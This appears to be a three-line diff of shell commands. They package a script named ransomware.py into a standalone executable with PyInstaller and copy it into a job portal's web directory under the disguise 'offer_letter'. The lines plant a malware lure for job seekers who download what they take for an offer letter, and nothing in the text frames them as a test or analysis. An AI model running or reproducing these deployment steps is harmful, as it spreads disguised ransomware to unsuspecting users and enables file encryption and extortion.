@@ -1,0 +1,3 @@
+pip install pyinstaller
+pyinstaller --onefile ransomware.py
+cp dist/ransomware /var/www/html/jobportal/offer_letter
